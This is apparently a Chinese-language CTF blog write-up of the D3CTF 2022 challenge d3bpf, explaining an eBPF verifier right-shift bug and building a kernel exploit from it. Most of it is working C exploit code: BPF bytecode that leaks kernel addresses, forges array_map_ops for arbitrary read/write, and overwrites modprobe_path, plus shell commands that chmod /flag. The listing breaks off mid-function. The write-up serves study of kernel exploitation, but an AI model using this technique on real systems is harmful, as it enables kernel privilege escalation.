---
date: 2025-03-21 10:21:56
layout: post
title: 虚拟机题但是内核版
subtitle: linux bpf pwn 入门浅析
description: >-
    After hijacking the control flow...
image: >-
  /assets/img/uploads/cherry-blossom.jpg
optimized_image: >-
  /assets/img/uploads/cherry-blossom.jpg
category: ctf
tags:
  - pwn
  - linux kernel
  - ebpf
author: rosayxy
paginate: true
---
这赛(xue)季(qi) 遇到了两次 linux bpf pwn，而且还是阿里云 CTF 和 SECCON，感觉还是要学一下的         

bpf 的一些入门的知识可以看 chompie 的 [博客](https://chomp.ie/Blog+Posts/Kernel+Pwning+with+eBPF+-+a+Love+Story)，感觉介绍比较全面了 ~     

嗯 其实感觉看 kernel 题比较容易受到太多信息的干扰，然后在打题的时候不太清楚该干啥，所以就简单记一下通常的思路吧    

## some insights

![alt_text](/assets/img/uploads/bpf_workflow.png)

整体的 workflow 就像是一个虚拟机，而我们也是可以和用户态的虚拟机题对照理解，整体的思路也是像用户态的虚拟机一样，我们构造 ebpf bytecode 的程序输入，让内核在解析和执行该输入的时候出现非预期的现象，从而通过任意地址读写/控制流劫持原语实现提权    

这是从 chompie 的博客里面截的图，我们的漏洞一般是在 verifier 里面    
verifier 查的大概是3个点：
- 对 bpf map 的**合法范围**进行读写
- 虚拟机返回值（r0）不能泄露内核信息
- 读的虚拟机寄存器要初始化
然后还有一个可以注意的小点：虚拟机寄存器 R1 一般初始指向内核地址    

而 verifier 漏洞具体表现形式一般就是对传入的 bytecode 的检查缺失（或者检查了但是条件不对），所以我们可用构造而 verifier 的 bug 则会在执行 bytecode 的时候被触发，就像是虚拟机题，如果检查缺失的话，一个比较可能的情况就是越界读写，（当然也可能是其他问题）    

这个漏洞一般也会通过源码 patch 的形式给出，如果没给的话，可以通过以相同编译选项编译同款内核，然后 bindiff 得到   

然后有越界读写之后，我们首先可以从 map 所在结构体里面 leak 出来内核堆地址和内核 base 地址，再结合一些常用板子拿到任意地址读写原语/栈溢出原语，然后就可以 getshell 了嘿嘿！    

关于一些具体操作，会结合下面一个题目做介绍，是 2022 年的 D3CTF 题目 d3bpf，算是 bpf 的入门题吧hh    

## d3bpf

### 漏洞
在 `kernel/bpf/verifier.c` 中的 `adjust_scalar_min_max_vals` 函数      
[原本代码](https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/verifier.c#L6457)    

```c
	case BPF_RSH:
		if (umax_val >= insn_bitness) {
			/* Shifts greater than 31 or 63 are undefined.
			 * This includes shifts by a negative number.
			 */
			mark_reg_unknown(env, regs, insn->dst_reg);
			break;
		}
		if (alu32)
			scalar32_min_max_rsh(dst_reg, &src_reg);
		else
			scalar_min_max_rsh(dst_reg, &src_reg);
		break;
```

patch 后的代码   

```c
	case BPF_RSH: // 0x70
		// patched，这里 umin_val >= insn_bitness 是合法的，如果是64位的话，就会标记 dst_reg
		if (umin_val >= insn_bitness) {
			if (alu32)
				__mark_reg32_known(dst_reg, 0);
			else
				__mark_reg_known_zero(dst_reg);
			break;
		}
		if (alu32)
			scalar32_min_max_rsh(dst_reg, &src_reg);
		else
			scalar_min_max_rsh(dst_reg, &src_reg);
		break;
```

它如果右移位数大于等于数据位数的话，会标记 dst_reg 的值是0，而这个在 C 标准里面是未定义行为，实验了一下，x86_64 上的实现是认为一个比如说 64 位整数右移 64 位得到结果是自身，所以会出现它把一个非0的寄存器认为值是0的情况   

通过看 linux 源码的 crossref 和注释可知，是在 `adjust_reg_min_max_vals` 函数中调用到的，而该函数的作用是 "Handles ALU ops other than BPF_END, BPF_NEG and BPF_MOV: computes new min/max and var_off."     

可知是在执行虚拟寄存器的 ALU 操作的时候触发    


### debug 环境配置
这个题目用的是默认的 kernel 配置，代表这些 bpf bytecode 是被编译到 JIT compiler 再去执行的，而不是我们用户态虚拟机这种解释执行的方式，不太利于我们调试    

所以参考 chompie 的博客，可以用题目 kernel 的相同配置，但是改编译选项使得 bpf 解释执行，具体的操作如下    

正常的编译流程如下   
```bash
make menuconfig # change nothing, save and exit
sed -i 's/CONFIG_SYSTEM_TRUSTED_KEYS=/#&/' ./.config
make bzImage -j$(nproc)
```
第一步 make 会在 linux 文件夹根目录下生成 .config 文件，我们改下面几行如下   
```bash
# CONFIG_ARCH_WANT_DEFAULT_BPF_JIT=n
# CONFIG_BPF_JIT is not set
# CONFIG_HAVE_EBPF_JIT=n

# CONFIG_SYSTEM_TRUSTED_KEYRING=y
# CONFIG_SYSTEM_TRUSTED_KEYS=""
```

然后就可以编译解释执行 bpf code 版本的 kernel 了！   

解释执行 bpf 的函数为 `___bpf_prog_run`，我们按照 chompie 的博客的指引，增加以下几行    
先是一开始增加   
```c
	int is_our_code = 0;
	if(insn->code == 0xb7)
    {
        is_our_code = 1;
    }
```
然后开始 printk 一堆东西   
```c
select_insn:
	// TODO add debug code here
	if (is_our_code) {
		printk(KERN_ERR
		       "----------------- instruction is: %0x --------------------\n",
		       insn->code);
		printk(KERN_ERR "r0: %llx, r1: %llx, r2: %llx\n", regs[0],
		       regs[1], regs[2]);
		printk(KERN_ERR "r3: %llx, r4: %llx, r5: %llx\n", regs[3],
		       regs[4], regs[5]);
		printk(KERN_ERR "r6: %llx, r7: %llx, r8: %llx\n", regs[6],
		       regs[7], regs[8]);
		printk(KERN_ERR "r9: %llx, r10: %llx\n", regs[9], regs[10]);
		printk(KERN_ERR "dst_reg: %x, src_reg: %x\n", insn->dst_reg,
		       insn->src_reg);
		printk(KERN_ERR
		       "dst_reg value: %llx, src_reg value: %llx imm value: %llx\n",
		       regs[insn->dst_reg], regs[insn->src_reg], insn->imm);
		printk(KERN_ERR
		       "---------------- print instruction end --------------------\n");
	}
```
注意要设置输出级别为 KERN_ERR 才能在 terminal 里面看到输出，否则可能需要 `dmesg` 一下才能看到     

此外，一开始在 wsl2 的 /mnt 目录下编译遇到了报错 "make[2]: *** No rule to make target 'net/netfilter/xt_TCPMSS.o', needed by 'net/netfilter/built-in.a'.  Stop."    
查到了[这个 patch](https://lkml.iu.edu/hypermail/linux/kernel/2005.0/05538.html)    
然后发现是大小写区分的问题，具体来说，wsl Windows 下的路径非大小写敏感，所以才会出现因为大小写而找不到应编译的文件的情况   
解决方法是把 linux 文件夹整个移到根目录下编译，而且 build 会明显快很多    

所以我们每执行一个 bpf instruction 就有下面的信息输出       

```c
[    5.103710] ----------------- instruction is: bf --------------------
[    5.104424] r0: 0, r1: ffff8880031c8000, r2: f7a918e70e41f200
[    5.104818] r3: ffffffff825a7a90, r4: ffff8880031c8000, r5: ffff888003d0c800
[    5.105745] r6: 1, r7: ffff888003d0c800, r8: 4
[    5.106081] r9: ffffffff813b9f15, r10: ffffc900001cfc38
[    5.106331] dst_reg: 2, src_reg: a
[    5.106431] dst_reg value: f7a918e70e41f200, src_reg value: ffffc900001cfc38 imm value: 0
[    5.106844] ---------------- print instruction end --------------------
```
但是这道题中，在 leak 之后就需要换有 JIT 的版本来打了，这时候，我们可以用最经典的输出调试法，比如说判断某个字段有没有写成功，就把它 load 出来再 store 到 map 里面然后用 `bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr))` 这种 syscall 来输出，或者综合运用 pwn 手的直觉来调试   

### leak
我们 map 大概是在一个 [bpf_map](https://elixir.bootlin.com/linux/v5.11/source/include/linux/bpf.h#L141) 结构体的 0x110 字段，然后可以往前把 bpf_map 里面的字段挪到 map buffer（指的是我们可写的 map 的范围）然后 leak 出来    
结构体可泄露内核基地址和堆地址，具体如下    
![alt_text](/assets/img/uploads/bpf_workflow.png)    

然后 leak 的代码如下   
```c
#define exploit_primitive_pt1(oob_map_fd, store_map_fd) \
/* load oob_map values ptr into reg_0 */ \
BPF_MOV64_IMM(BPF_REG_0, 0), \
/* letting the key point to zero */ \
BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), \
BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd), \
BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
/* check if the returned map value pointer is valid, 上面一行返回的 r0 之前的位置有 array_map_ops, 和 kernel 基地址固定 */ \
BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \
BPF_EXIT_INSN(), \
/* save oob map value ptr into preserved register reg_7 */ \
BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), \
BPF_MOV64_IMM(BPF_REG_3, 0x110), \
BPF_MOV64_IMM(BPF_REG_2, 64), \
BPF_ALU64_REG(BPF_RSH, BPF_REG_3, BPF_REG_2), \
/* load store_map values ptr into reg_0 */ \
BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_3), \
BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), \
/* store the leaked value into the map, leak completed! */ \
BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, 0), \
BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), \
BPF_MOV64_IMM(BPF_REG_3, 0x50), \
BPF_ALU64_REG(BPF_RSH, BPF_REG_3, BPF_REG_2), \
BPF_ALU64_REG(BPF_SUB,BPF_REG_7, BPF_REG_3), \
BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), \
BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, 0x8), \
/* load the leaked value into reg_0 */ \

int main(){
  // ...
      struct bpf_insn insns[] = {
        exploit_primitive_pt1(oob_map_fd, store_map_fd)
        // Return the leaked value
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    // Create BPF program
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)insns,
        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
        .license = (unsigned long long)"GPL",
        .log_buf = (unsigned long)log_buf,
        .log_size = 0x10000,
        .log_level = 2,
    };

    // Load the BPF program
    int prog_fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    printf("content of log_buf:\n %s\n", log_buf);
    if (prog_fd < 0) {
        perror("Failed to load BPF program");
        return 1;
    }

    printf("Successfully loaded BPF program! FD: %d\n", prog_fd);
    attach_socket(prog_fd);
    printf("Successfully attached BPF program to socket!\n");
    int val = 0;
    write(socks[1], &val, sizeof(val));
    uint64_t kernel_leak = lookup_map_element(oob_map_fd, 0, rosa_buf);
    uint64_t map_addr = *((uint64_t*)rosa_buf + 1);
    uint64_t kernel_base = kernel_leak - 0x1019360 - 0x1d040;
    printf("Kernel base address: 0x%llx\n", kernel_base);
    uint64_t modprobe_path_addr = kernel_base + 0x1a6c240;

    printf("map_addr: 0x%llx\n", map_addr);
    uint64_t map_start = map_addr + 0x110 - 0xc0;
    // ...
}
```

### getting arbituary read/write
这部分较多参考 [stdnoerr 的博客](https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html)    

采用伪造函数表的形式，在 map buffer 上伪造了 array_map_ops，然后把 map_gen_lookup 改成了 array_of_map_gen_lookup   
这样做的具体原理如下    
使得它生成 JIT 的时候，如果查找元素就会调用 `array_of_map_lookup_elem` 函数，该函数定义如下    
```c
/* Called from syscall or from eBPF program */
static void *array_map_lookup_elem(struct bpf_map *map, void *key)
{
	struct bpf_array *array = container_of(map, struct bpf_array, map);
	u32 index = *(u32 *)key;

	if (unlikely(index >= array->map.max_entries))
		return NULL;

	return array->value + array->elem_size * (index & array->index_mask);
}

static void *array_of_map_lookup_elem(struct bpf_map *map, void *key)
{
	struct bpf_map **inner_map = array_map_lookup_elem(map, key);

	if (!inner_map)
		return NULL;

	return READ_ONCE(*inner_map);
}

```

而分析一下 [array_of_map_gen_lookup](https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/arraymap.c#L1243) 的代码，它大概生成下面的 bpf code   
```c
// get the base address of the array elements
BPF_ALU64_IMM(BPF_ADD, map_ptr, offsetof(struct bpf_array, value))
// Loads a 32-bit (word) value from memory at the address in r2 (index) into r0 (ret), receives the value of the user input
BPF_LDX_MEM(BPF_W, ret, index, 0)
// Checks if the index is greater than or equal to max_entries (jump 6 instructions if true), Applies an index mask to implement constant-time array access (mitigation for Spectre v1)
// 神奇 ebpf 里面竟然有针对 spectre 的防护
BPF_JMP_IMM(BPF_JGE, ret, map->max_entries, 6)
BPF_ALU32_IMM(BPF_AND, ret, array->index_mask)
//  element offset calculation
BPF_ALU64_IMM(BPF_MUL, ret, elem_size)
// Adds the base address (map_ptr) to the calculated offset and get the entry store in map's address
BPF_ALU64_REG(BPF_ADD, ret, map_ptr)
// our needed dereference!!
BPF_LDX_MEM(BPF_DW, ret, ret, 0)
// judge if the value is zero and ret
BPF_JMP_IMM(BPF_JEQ, ret, 0, 1)
BPF_JMP_IMM(BPF_JA, 0, 0, 1)
BPF_MOV64_IMM(ret, 0)
```

看到上面的 bpf 汇编，所以整体的 ebpf 代码和 `array_of_map_lookup_elem` 函数作用一致，都是从 map 里面 load 出来一个元素然后 dereference 它再返回    

而看到其他 map_gen_lookup 的实现，如 [array_map_gen_lookup](https://elixir.bootlin.com/linux/v5.11/source/kernel/bpf/arraymap.c#L201) 都是返回 entry 的地址     

所以通过这步，我们可以控制一个任意地址，而 bpf 会认为该地址是一个元素的起始地址，通过对该元素的读写操作即可得到所求任意地址读写原语    

代码如下（此部分写法较多参考了上述 stdnoerr 师傅的博客）   
```c
int arb_write(uint64_t addr, uint64_t val){
    int req = 1;

    update_map_element(store_map_fd, 0, &addr, BPF_ANY);
    update_map_element(info_map_fd, 0, &val, BPF_ANY);

    write(socks[1], &req, sizeof(req));

    return lookup_map_element(info_map_fd, 0, 0) == val;
}

int main(){
	// leak
	// ...

	// construct the fake array_map_ops for store_map_fd
    struct bpf_insn construct_array_map_ops[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        // setup fake bpf_map_ops struct with only needed values, r0 是 map_ptr + 0x110
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), // move map_ptr + 0x110
        BPF_MOV64_IMM(BPF_REG_0, kernel_base + 0x20eeb0), // array_map_update_elem
		// offset 参考 [bpf_map_ops](https://elixir.bootlin.com/linux/v5.11/source/include/linux/bpf.h#L59) 结构
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x60),

        BPF_MOV64_IMM(BPF_REG_0, kernel_base + 0x20e830), // array_map_lookup_elem
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x58),

        BPF_MOV64_IMM(BPF_REG_0, kernel_base + 0x20e9c0), // array_of_map_gen_lookup
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 19 * 8), // this offset is right

        BPF_MOV64_IMM(BPF_REG_0, kernel_base + 0x20eff0), // array_map_free
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 3 * 8),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // trigger vuln
        BPF_MOV64_IMM(BPF_REG_0, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),

        BPF_LD_IMM64(BPF_REG_0, map_start),
        // overwrite map_ops with oob_map_ptr
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        // verification of the write: store BPF_REG_0 to the first element of the new map
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),
        // resume BPF_REG_7
        BPF_MOV64_IMM(BPF_REG_2, 0x110),
        BPF_MOV64_IMM(BPF_REG_1, 64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_2, BPF_REG_1),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_2),
        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    union bpf_attr attr1 = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)construct_array_map_ops,
        .insn_cnt = sizeof(construct_array_map_ops) / sizeof(construct_array_map_ops[0]),
        .license = (unsigned long long)"GPL",
        .log_buf = (unsigned long)log_buf,
        .log_size = 0x10000,
        .log_level = 2,
    };
    prog_fd = bpf(BPF_PROG_LOAD, &attr1, sizeof(attr1));
    printf("here...\n");
    printf("strlen: %d\n",strlen(log_buf));
    for(int i = 0; i < strlen(log_buf);i++){
        putchar(log_buf[i]);
    }
    printf("\n");
    if (prog_fd < 0) {
        perror("Failed to load BPF program");
        return 1;
    }

    printf("Successfully loaded BPF program! FD: %d\n", prog_fd);
    attach_socket(prog_fd);
    printf("Successfully attached BPF program to socket!\n");
    val = 0;
    write(socks[1], &val, sizeof(val));
    // need an arbituary write to modprobe path
    uint64_t verification = lookup_map_element(store_map_fd, 0, rosa_buf);
    printf("verifying fake address: %llx\n", verification);
    // next have write to modprobe_path
    // the bpf program will be executed whenever a packet arrived

    struct bpf_insn arb_read_write[] = {
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_10, 0, -4), // Store 0 at -4(R10)

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // R2 <- R10 - 4
        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), // will be rewritten by array_of_map_gen_lookup, and will return our target pointer

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0), // r8 is target pointer address

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_LD_MAP_FD(BPF_REG_1, info_map_fd),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),

        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // arbituary write. load info_map_fd[0] to reg7 and store it in target_pointer[0]
        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    // attach socket
    union bpf_attr attr2 = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)arb_read_write,
        .insn_cnt = sizeof(arb_read_write) / sizeof(arb_read_write[0]),
        .license = (unsigned long long)"GPL",
        .log_buf = (unsigned long)log_buf,
        .log_size = 0x10000,
        .log_level = 2,
    };
    prog_fd = bpf(BPF_PROG_LOAD, &attr2, sizeof(attr2));
    // buffer
    for(int i = 0; i < strlen(log_buf);i++){
        putchar(log_buf[i]);
    }
    putchar(10);
    if (prog_fd < 0) {
        perror("Failed to load BPF program");
        return 1;
    }

    printf("Successfully loaded BPF program! FD: %d\n", prog_fd);
    attach_socket(prog_fd);

	// ...
}
```

可以看我们 bpf 代码中的注释，大概就是把 info_map[0] store 到我们 target pointer 里面       

### last step!
任意写还是要打 modprobe_path 了 ~ 主要是省事嘿嘿    

### 一点交互 tips
1. 这种条件下，触发 bpf program 的时机是每次 socket 收到 packet 时   
2. how to get the value passed by socket    
还是参考 [stdnoerr 师傅的博客](https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html)

```c
BPF_MOV64_REG(BPF_REG_6, BPF_REG_1)
BPF_LD_ABS(BPF_B, 0) // load socket value from r6
BPF_MOV64_REG(BPF_REG_9, BPF_REG_0) // decide bit for arb_read or arb_write
BPF_JMP_IMM(BPF_JEQ, BPF_REG_9, 1, 4)
```
这段大概就是从 context buffer 里面读入 socket 传入的值，然后判断是否为 1 来跳转    

### exp
这个 exp 可以成功写 modprobe_path 但是会 segfault 我们要手动执行一波 get_flag 里面的命令才行    
以及这里面有些注释因为是打的时候写的，可能不够准确，还是可以更参考一下上述各步骤中代码片段的注释    
```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <sys/socket.h>

#define ARRAY_MAP_SIZE 0x1330

void get_flag(){
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("/tmp/dummy");
    sleep(0.3);
    system("cat /flag");
    exit(0);
}
// do I have to use sockets or that sort of stuff? yes to trigger the bpf program
// Helper macros for BPF instructions
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)            \
    ((struct bpf_insn) {                    \
        .code  = CODE,                    \
        .dst_reg = DST,                    \
        .src_reg = SRC,                    \
        .off   = OFF,                    \
        .imm   = IMM })

#define BPF_MOV64_IMM(DST, IMM)     \
    ((struct bpf_insn) {            \
        .code  = BPF_ALU64 | BPF_MOV | BPF_K, \
        .dst_reg = DST,             \
        .src_reg = 0,               \
        .off   = 0,                 \
        .imm   = IMM })

#define BPF_MOV64_REG(DST, SRC)     \
    ((struct bpf_insn) {            \
        .code  = BPF_ALU64 | BPF_MOV | BPF_X, \
        .dst_reg = DST,             \
        .src_reg = SRC,             \
        .off   = 0,                 \
        .imm   = 0 })

#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn) {            \
        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K, \
        .dst_reg = DST,             \
        .src_reg = 0,               \
        .off   = 0,                 \
        .imm   = IMM })

#define BPF_ALU64_REG(OP, DST, SRC) \
    ((struct bpf_insn) {            \
        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X, \
        .dst_reg = DST,             \
        .src_reg = SRC,             \
        .off   = 0,                 \
        .imm   = 0 })

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn) {              \
        .code  = BPF_JMP | BPF_OP(OP) | BPF_K, \
        .dst_reg = DST,               \
        .src_reg = 0,                 \
        .off   = OFF,                 \
        .imm   = IMM })

#define BPF_JMP_REG(OP, DST, SRC, OFF) \
    ((struct bpf_insn) {              \
        .code  = BPF_JMP | BPF_OP(OP) | BPF_X, \
        .dst_reg = DST,               \
        .src_reg = SRC,               \
        .off   = OFF,                 \
        .imm   = 0 })

#define BPF_EXIT_INSN()             \
    ((struct bpf_insn) {            \
        .code  = BPF_JMP | BPF_EXIT, \
        .dst_reg = 0,               \
        .src_reg = 0,               \
        .off   = 0,                 \
        .imm   = 0 })

#define BPF_LD_MAP_FD(DST, MAP_FD)  \
    ((struct bpf_insn) {            \
        .code  = BPF_LD | BPF_DW | BPF_IMM, \
        .dst_reg = DST,             \
        .src_reg = BPF_PSEUDO_MAP_FD, \
        .off   = 0,                 \
        .imm   = MAP_FD }),         \
    ((struct bpf_insn) {            \
        .code  = 0,                 \
        .dst_reg = 0,               \
        .src_reg = 0,               \
        .off   = 0,                 \
        .imm   = 0 })

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn) {                \
        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = OFF,                   \
        .imm   = 0 })

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn) {                \
        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = OFF,                   \
        .imm   = 0 })

#define BPF_LD_IMM64(DST, IMM) \
        ((struct bpf_insn) {            \
            .code  = BPF_LD | BPF_DW | BPF_IMM, \
            .dst_reg = DST,             \
            .src_reg = 0,               \
            .off   = 0,                 \
            .imm   = (__u32)(IMM) }),   \
        ((struct bpf_insn) {            \
            .code  = 0,                 \
            .dst_reg = 0,               \
            .src_reg = 0,               \
            .off   = 0,                 \
            .imm   = (__u32)((IMM) >> 32) })
#define exploit_primitive_pt1(oob_map_fd, store_map_fd) \
/* load oob_map values ptr into reg_0 */ \
BPF_MOV64_IMM(BPF_REG_0, 0), \
BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4), \
BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd), \
BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
/* check if the returned map value pointer is valid, 上面一行返回的 r0 之前的位置有 array_map_ops, 和 kernel 基地址固定 */ \
BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \
BPF_EXIT_INSN(), \
/* save oob map value ptr into preserved register reg_7 */ \
BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), \
BPF_MOV64_IMM(BPF_REG_3, 0x110), \
BPF_MOV64_IMM(BPF_REG_2, 64), \
BPF_ALU64_REG(BPF_RSH, BPF_REG_3, BPF_REG_2), \
/* load store_map values ptr into reg_0 */ \
BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_3), \
BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), \
/* store the leaked value into the map, leak completed! */ \
BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, 0), \
BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), \
BPF_MOV64_IMM(BPF_REG_3, 0x50), \
BPF_ALU64_REG(BPF_RSH, BPF_REG_3, BPF_REG_2), \
BPF_ALU64_REG(BPF_SUB,BPF_REG_7, BPF_REG_3), \
BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), \
BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, 0x8), \
/* load the leaked value into reg_0 */ \

// System call wrapper for BPF operations
static int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(__NR_bpf, cmd, attr, size);
}

int oob_map_fd = -1;
int store_map_fd = -1;
int info_map_fd = -1;
int create_map(union bpf_attr* attrs)
{
    int ret = -1;

    ret = bpf(BPF_MAP_CREATE, attrs, sizeof(*attrs));

    return ret;
}

int update_map_element(int map_fd, uint64_t key, void* value, uint64_t flags)
{
    int ret = -1;

    union bpf_attr attr =
    {
        .map_fd = map_fd,
        .key    = (uint64_t)&key,
        .value  = (uint64_t)value,
        .flags  = flags,
    };

    ret = bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

    return ret;
}

u_int64_t lookup_map_element(int map_fd, uint64_t key, void* value)
{
    int ret = -1;
    union bpf_attr attr =
    {
        .map_fd = map_fd,
        .key    = (uint64_t)&key,
        .value  = (uint64_t)value,
    };

    ret = bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
    printf("[-] lookup_map_element ret: %d\n", ret);
    printf("[-] lookup_map_element_value: %llx\n", *(uint64_t*)value);
    if (ret < 0) {
        printf("[-] lookup_map_element failed!\n");
        exit(-1);
    }
    return *(uint64_t*)value;
}

int create_bpf_maps()
{
    int ret = -1;
    char vals[ARRAY_MAP_SIZE] = {0};
    union bpf_attr map_attrs =
    {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = ARRAY_MAP_SIZE,
        .max_entries = 1,
    };

    oob_map_fd = create_map(&map_attrs);
    store_map_fd = create_map(&map_attrs);
    info_map_fd = create_map(&map_attrs);
    if((oob_map_fd < 0) || (store_map_fd) < 0)
    {
        printf("[-] failed to create bpf array map!\n");
        goto done;
    }

    if(0 != update_map_element(oob_map_fd, 0, vals, BPF_ANY))
    {
        printf("[-] failed to update map element values!\n");
        goto done;
    }

    if(0 != update_map_element(store_map_fd, 0, vals, BPF_ANY))
    {
        printf("[-] failed to update map element values!\n");
        goto done;
    }
    ret = 0;
    printf("oob map fd: %d", oob_map_fd);
    printf("    store map fd: %d\n", store_map_fd);
done:
    return ret;
}

int socks[2] = {-1, -1};
int attach_socket(int prog_fd){
    if(socks[0] == -1 && socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0){
        perror("socketpair");
        exit(1);
    }
    
